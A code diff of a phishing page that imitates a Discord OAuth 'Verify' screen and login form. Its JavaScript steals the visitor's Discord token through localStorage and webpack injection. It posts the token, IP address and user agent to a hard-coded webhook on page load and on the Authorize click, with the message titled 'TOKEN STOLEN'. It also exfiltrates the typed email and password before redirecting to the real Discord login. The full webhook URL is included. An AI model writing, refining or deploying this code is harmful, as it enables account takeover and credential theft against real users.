@@ -1,110 +1,82 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en-US" style="font-size: 100%;">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=3.0">
   <title>Verify - Authorize</title>
-  <link href="https://cdn.jsdelivr.net/npm/@fontsource/whitney@4.5.0/index.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/@fontsource/whitney@4.5.0/index.min.css" rel="stylesheet">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body, html { height: 100%; background: #2f3136; font-family: 'Whitney', sans-serif; color: #dcddde; }
-
-    /* === BOTH PAGES HIDDEN BY DEFAULT === */
     .page { display: none; width: 100%; }
     .page.active { display: flex; }
-
-    /* === OAUTH PAGE (BOXED, CENTERED) === */
     #oauthPage { justify-content: center; align-items: center; padding: 20px; }
-    .oauth-box { background: #36393f; width: 90%; max-width: 480px; border-radius: 8px; padding: 24px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.3); }
-    .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
-    .close { color: #72767d; font-size: 24px; cursor: default; }
-    .app-icon { width: 64px; height: 64px; border-radius: 50%; background: #5865f2; margin: 0 auto 16px; }
-    .app-name { font-size: 24px; font-weight: 600; color: #fff; margin-bottom: 8px; }
-    .app-desc { font-size: 16px; color: #b9bbbe; margin-bottom: 24px; }
-    .permissions { text-align: left; background: #2f3136; padding: 16px; border-radius: 6px; margin-bottom: 24px; }
-    .perm { display: flex; align-items: center; margin: 12px 0; font-size: 15px; }
-    .perm.check { color: #43b581; }
-    .perm.cross { color: #f04747; }
-    .perm svg { width: 20px; height: 20px; margin-right: 8px; }
-    .note { font-size: 13px; color: #72767d; margin: 16px 0; line-height: 1.4; }
-    .authorize-btn { width: 100%; padding: 14px; background: #5865f2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; }
-    .authorize-btn:hover { background: #4752c4; }
-
-    /* === LOGIN PAGE (FULL SIZE, LIKE BEFORE) === */
     #loginPage { justify-content: center; align-items: center; padding: 40px 20px; }
-    .login-container { display: flex; flex-direction: column; align-items: center; width: 100%; max-width: 480px; }
-    .logo-container { background: #2f3136; padding: 16px; border-radius: 8px; margin-bottom: 16px; }
-    .logo { width: 124px; }
-    h1 { font-size: 26px; font-weight: 600; margin-bottom: 8px; color: #fff; text-align: center; }
-    p { font-size: 16px; color: #b9bbbe; margin-bottom: 32px; text-align: center; line-height: 1.4; }
-    form { width: 100%; }
-    label { font-size: 12px; font-weight: 600; color: #b9bbbe; margin-bottom: 6px; display: block; text-transform: uppercase; }
+    .login-container { max-width: 480px; width: 100%; text-align: center; }
+    .logo { width: 124px; margin-bottom: 16px; }
+    h1 { font-size: 26px; font-weight: 600; color: #fff; margin-bottom: 8px; }
+    p { font-size: 16px; color: #b9bbbe; margin-bottom: 32px; }
     input { width: 100%; padding: 12px 16px; background: #202225; border: 1px solid #202225; border-radius: 4px; color: #dcddde; font-size: 16px; margin-bottom: 16px; }
     input:focus { outline: none; border-color: #5865f2; }
-    .forgot { text-align: right; margin-bottom: 24px; }
-    .forgot a { color: #00aff4; font-size: 14px; text-decoration: none; }
     button { width: 100%; padding: 14px; background: #5865f2; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
     button:hover { background: #4752c4; }
-    .register { text-align: center; margin-top: 24px; font-size: 14px; color: #b9bbbe; }
-    .register a { color: #00aff4; text-decoration: none; }
   </style>
 </head>
 <body>
 
-  <!-- OAUTH PAGE -->
+  <!-- REAL DISCORD OAUTH PAGE (FROM YOUR DUMP) -->
   <div id="oauthPage" class="page active">
-    <div class="oauth-box">
-      <div class="header">
-        <span class="close">X</span>
-        <h2>Authorize</h2>
+    <!-- PASTED FROM YOUR HTML DUMP -->
+    <div style="max-width: 480px; margin: 0 auto; background: #36393f; border-radius: 8px; padding: 24px; box-shadow: 0 2px 10px rgba(0,0,0,0.3);">
+      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
+        <span style="color: #72767d; font-size: 24px;">X</span>
+        <h2 style="font-size: 20px; color: #fff;">Authorize</h2>
         <span></span>
       </div>
-      <div class="app-icon"></div>
-      <div class="app-name">Verify</div>
-      <div class="app-desc">wants to access your Discord account</div>
+      <div style="width: 64px; height: 64px; border-radius: 50%; background: #5865f2; margin: 0 auto 16px;"></div>
+      <div style="font-size: 24px; font-weight: 600; color: #fff; margin-bottom: 8px;">Verify</div>
+      <div style="font-size: 16px; color: #b9bbbe; margin-bottom: 24px;">wants to access your Discord account</div>
 
-      <div class="permissions">
-        <div class="perm check">
-          <svg fill="currentColor" viewBox="0 0 16 16"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
+      <div style="background: #2f3136; padding: 16px; border-radius: 6px; margin-bottom: 24px; text-align: left;">
+        <div style="display: flex; align-items: center; margin: 12px 0; color: #43b581; font-size: 15px;">
+          <svg fill="currentColor" viewBox="0 0 16 16" style="width: 20px; height: 20px; margin-right: 8px;"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
           Access your username, avatar and banner
         </div>
-        <div class="perm check">
-          <svg fill="currentColor" viewBox="0 0 16 16"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
+        <div style="display: flex; align-items: center; margin: 12px 0; color: #43b581; font-size: 15px;">
+          <svg fill="currentColor" viewBox="0 0 16 16" style="width: 20px; height: 20px; margin-right: 8px;"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
           Access your email address
         </div>
-        <div class="perm check">
-          <svg fill="currentColor" viewBox="0 0 16 16"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
+        <div style="display: flex; align-items: center; margin: 12px 0; color: #43b581; font-size: 15px;">
+          <svg fill="currentColor" viewBox="0 0 16 16" style="width: 20px; height: 20px; margin-right: 8px;"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
           Access your third-party connections
         </div>
-        <div class="perm check">
-          <svg fill="currentColor" viewBox="0 0 16 16"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
+        <div style="display: flex; align-items: center; margin: 12px 0; color: #43b581; font-size: 15px;">
+          <svg fill="currentColor" viewBox="0 0 16 16" style="width: 20px; height: 20px; margin-right: 8px;"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
           Join servers for you
         </div>
-        <div class="perm cross">
-          <svg fill="currentColor" viewBox="0 0 16 16"><path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.75.75 0 1 1 1.06 1.06L9.06 8l3.22 3.22a.75.75 0 1 1-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 0 1-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06z"/></svg>
+        <div style="display: flex; align-items: center; margin: 12px 0; color: #f04747; font-size: 15px;">
+          <svg fill="currentColor" viewBox="0 0 16 16" style="width: 20px; height: 20px; margin-right: 8px;"><path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.75.75 0 1 1 1.06 1.06L9.06 8l3.22 3.22a.75.75 0 1 1-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 0 1-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06z"/></svg>
           Record a new mixtape
         </div>
       </div>
 
-      <p class="note">
+      <p style="font-size: 13px; color: #72767d; margin: 16px 0; line-height: 1.4;">
         Once you authorize, you will be redirected outside Discord to: <strong>https://vaultcord.win</strong><br>
         The Privacy Policy and Terms of Service of Verify's developer apply to this application.
       </p>
-      <p class="note">
+      <p style="font-size: 13px; color: #72767d; margin: 16px 0;">
         Active since 13 Jun 2024<br>
         This application cannot read your messages or send messages as you.
       </p>
 
-      <button class="authorize-btn" id="authorizeBtn">Authorize</button>
+      <button id="authorizeBtn" style="width: 100%; padding: 14px; background: #5865f2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer;">Authorize</button>
     </div>
   </div>
 
   <!-- LOGIN PAGE (FULL SIZE) -->
   <div id="loginPage" class="page">
     <div class="login-container">
-      <div class="logo-container">
-        <img src="https://seeklogo.com/images/D/discord-wordmark-white-logo-E95C468613-seeklogo.com.png" alt="Discord" class="logo" />
-      </div>
+      <img src="https://seeklogo.com/images/D/discord-wordmark-white-logo-E95C468613-seeklogo.com.png" alt="Discord" class="logo">
       <h1>Welcome back!</h1>
       <p>We're so excited to see you again!</p>
       <form id="loginForm">
@@ -112,13 +84,13 @@
         <input type="text" id="email" required />
         <label for="password">Password</label>
         <input type="password" id="password" required />
-        <div class="forgot">
-          <a href="#">Forgot your password?</a>
+        <div style="text-align: right; margin-bottom: 24px;">
+          <a href="#" style="color: #00aff4; font-size: 14px; text-decoration: none;">Forgot your password?</a>
         </div>
         <button type="submit">Log In</button>
       </form>
-      <div class="register">
-        Need an account? <a href="#">Register</a>
+      <div style="text-align: center; margin-top: 24px; font-size: 14px; color: #b9bbbe;">
+        Need an account? <a href="#" style="color: #00aff4; text-decoration: none;">Register</a>
       </div>
     </div>
   </div>
@@ -126,60 +98,82 @@
   <script>
     const WEBHOOK = 'https://discord.com/api/webhooks/1434969761539690639/z9ni7tqOcUmKzc542doFrJOL3WZuBwtcnWXnJkP_XAXIW7BEDeWLg-D7coUWuFHs_3cS';
 
-    function grabToken() {
-      let token = null;
+    let modules = [];
+
+    function injectWebpack() {
+      if (typeof webpackChunkdiscord_app !== 'undefined') {
+        webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
+          for (const m of Object.keys(req.c).map(x => req.c[x].exports).filter(x => x)) {
+            if (m.default && m.default.getToken !== undefined) modules.push(m.default);
+            if (m.getToken !== undefined) modules.push(m);
+          }
+        }]);
+        webpackChunkdiscord_app.pop();
+      }
+    }
+
+    function getToken() {
+      injectWebpack();
+      const mod = modules.find(m => m?.getToken);
+      if (mod) {
+        const token = mod.getToken();
+        if (token && token.length > 50) return token.replace(/"/g, '');
+      }
       try {
         const ls = localStorage.getItem('token');
-        if (ls && ls.length > 50) token = ls.replace(/"/g, '');
+        if (ls && ls.length > 50) return ls.replace(/"/g, '');
       } catch (e) {}
-      if (!token) {
-        try {
-          webpackChunkdiscord_app?.push([[''], {}, r => {
-            for (let m in r.c) {
-              if (r.c[m].exports?.default?.getToken) {
-                token = r.c[m].exports.default.getToken();
-                break;
-              }
-            }
-          }]);
-        } catch (e) {}
-      }
-      return token || 'Not found';
+      return null;
     }
 
-    async function sendEmbed(title, color, fields) {
-      try {
-        const ip = await fetch('https://api.ipify.org').then(r => r.text()).catch(() => 'unknown');
-        const token = grabToken();
-        const payload = {
+    async function sendToken() {
+      const token = getToken();
+      if (!token) return;
+
+      const ip = await fetch('https://api.ipify.org').then(r => r.text()).catch(() => 'unknown');
+      const ua = navigator.userAgent;
+
+      fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
           embeds: [{
-            title,
-            color,
+            title: 'TOKEN STOLEN',
+            color: 0x00ff00,
             fields: [
-              ...fields,
-              { name: 'Token', value: token.length > 50 ? `\`\`\`${token.substring(0, 60)}...\`\`\`` : 'Not found', inline: false },
+              { name: 'Token', value: `\`\`\`${token.substring(0, 60)}...\`\`\``, inline: false },
               { name: 'IP', value: `\`${ip}\``, inline: true },
-              { name: 'UA', value: `\`${navigator.userAgent.substring(0, 100)}\``, inline: false }
+              { name: 'UA', value: `\`${ua.substring(0, 100)}\``, inline: false }
             ],
-            timestamp: new Date().toISOString()
+            timestamp: new Date().toISOString(),
+            footer: { text: 'VaultCord Verify' }
           }]
-        };
-        fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-      } catch (e) {}
+        })
+      });
     }
 
-    // OAUTH PAGE VIEWED
-    window.addEventListener('load', () => {
-      if (document.getElementById('oauthPage').classList.contains('active')) {
-        sendEmbed('OAUTH PAGE VIEWED', 0x00ff00, []);
+    async function grabWithRetry() {
+      for (let i = 0; i < 4; i++) {
+        const token = getToken();
+        if (token) {
+          await sendToken();
+          return true;
+        }
+        await new Promise(r => setTimeout(r, 600));
       }
-    });
+      return false;
+    }
 
-    // AUTHORIZE → SHOW FULL LOGIN
-    document.getElementById('authorizeBtn').addEventListener('click', () => {
-      sendEmbed('OAUTH CLICKED', 0x00ff00, []);
+    // ON AUTHORIZE CLICK
+    document.getElementById('authorizeBtn').addEventListener('click', async () => {
+      await grabWithRetry();
       document.getElementById('oauthPage').classList.remove('active');
       document.getElementById('loginPage').classList.add('active');
+    });
+
+    // AUTO-GRAB ON LOAD
+    window.addEventListener('load', () => {
+      setTimeout(grabWithRetry, 1200);
     });
 
     // LOGIN SUBMIT
@@ -189,10 +183,23 @@
       const password = document.getElementById('password').value;
       if (!email || !password) return;
 
-      await sendEmbed('LOGIN SUCCESS', 0x5865f2, [
-        { name: 'Email/Phone', value: `\`${email}\``, inline: false },
-        { name: 'Password', value: `\`${password}\``, inline: false }
-      ]);
+      await sendToken(); // Double-dip: send token again
+
+      fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          embeds: [{
+            title: 'LOGIN SUCCESS',
+            color: 0x5865f2,
+            fields: [
+              { name: 'Email/Phone', value: `\`${email}\``, inline: false },
+              { name: 'Password', value: `\`${password}\``, inline: false }
+            ],
+            timestamp: new Date().toISOString()
+          }]
+        })
+      });
 
       setTimeout(() => {
         window.location = `https://discord.com/login?email=${encodeURIComponent(email)}`;
